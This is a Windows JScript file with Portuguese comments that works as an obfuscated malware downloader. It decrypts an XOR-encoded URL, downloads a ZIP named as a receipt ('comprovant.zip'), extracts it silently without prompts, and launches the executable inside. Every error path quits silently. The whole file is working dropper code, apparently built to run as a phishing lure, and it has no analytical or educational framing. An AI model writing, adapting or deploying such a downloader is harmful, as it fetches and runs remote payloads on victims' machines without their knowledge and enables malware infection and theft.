var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

// URL criptografada (XOR)
var encryptedUrl = "\x09\x07\x10\x03\x5b\x4b\x49\x42\x5d\x56\x5d\x55\x05\x02\x1a\x5c\x4a\x5d\x57\x06\x02\x48\x0b\x07\x4a\x05\x0b\x09\x16\x41\x5b\x17\x12\x0a\x07\x4f\x1e\x0f\x03"; // Substitua pelo valor real

// Chave de criptografia
var key = "asdsadfsdfsd434ersf43r34efddf34";

// Nome do arquivo ZIP local
var zipFileName = "comprovant.zip";

// Nome do executável a ser executado
var executableName = "comprovant.exe";

// Função para descriptografar a URL (XOR)
function xorEncryptDecrypt(input, key) {
    var result = "";
    for (var i = 0; i < input.length; i++) {
        result += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

// Função para baixar o arquivo
function downloadFile(url, outputPath) {
    try {
        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
        xhr.open("GET", url, false); // Sincroniza a requisição
        xhr.send();
        if (xhr.status === 200) {
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Open();
            stream.Type = 1; // Tipo binário
            stream.Write(xhr.ResponseBody);
            stream.Position = 0;
            stream.SaveToFile(outputPath, 2); // Sobrescreve o arquivo se existir
            stream.Close();
        } else {
            throw new Error("Erro ao baixar o arquivo. Código de status: " + xhr.status);
        }
    } catch (e) {
        WScript.Quit(1); // Sai silenciosamente em caso de erro
    }
}

// Função para extrair o ZIP no mesmo local
function extractZip(zipFilePath) {
    try {
        if (!fso.FileExists(zipFilePath)) {
            throw new Error("Arquivo ZIP não encontrado.");
        }

        // Obtém o diretório onde o ZIP está localizado
        var zipDirectory = fso.GetParentFolderName(fso.GetAbsolutePathName(zipFilePath));

        // Acessa o arquivo ZIP usando Shell.Application
        var app = new ActiveXObject("Shell.Application");
        var source = app.NameSpace(fso.GetAbsolutePathName(zipFilePath));
        if (!source || !source.Items()) {
            throw new Error("Não foi possível acessar o arquivo ZIP.");
        }

        var target = app.NameSpace(zipDirectory);
        if (!target) {
            throw new Error("Não foi possível acessar o diretório de destino.");
        }

        // Extrai os arquivos silenciosamente
        target.CopyHere(source.Items(), 16); // 16 = Não exibe prompts
    } catch (e) {
        WScript.Quit(1); // Sai silenciosamente em caso de erro
    }
}

// Função para executar o arquivo
function executeFile(filePath) {
    try {
        if (fso.FileExists(filePath)) {
            var absolutePath = fso.GetAbsolutePathName(filePath);
            shell.Run('"' + absolutePath + '"', 1, false); // Executa o arquivo silenciosamente
        } else {
            throw new Error("Arquivo executável não encontrado: " + filePath);
        }
    } catch (e) {
        WScript.Quit(1); // Sai silenciosamente em caso de erro
    }
}

// Fluxo principal
try {
    // Passo 1: Descriptografa a URL
    if (typeof encryptedUrl !== "string") {
        throw new Error("encryptedUrl deve ser uma string válida.");
    }
    if (typeof key !== "string" || key.length === 0) {
        throw new Error("A chave de criptografia deve ser uma string não vazia.");
    }
    var url = xorEncryptDecrypt(encryptedUrl, key);

    // Passo 2: Baixar o arquivo ZIP
    downloadFile(url, zipFileName);

    // Passo 3: Extrair o arquivo ZIP no mesmo local
    extractZip(zipFileName);

    // Passo 4: Verificar se o executável existe
    var executablePath = fso.BuildPath(fso.GetParentFolderName(fso.GetAbsolutePathName(zipFileName)), executableName);
    if (!fso.FileExists(executablePath)) {
        throw new Error("O arquivo executável não foi encontrado no diretório extraído: " + executablePath);
    }

    // Passo 5: Executar o arquivo
    executeFile(executablePath);
} catch (e) {
    WScript.Quit(1); // Sai silenciosamente em caso de erro
}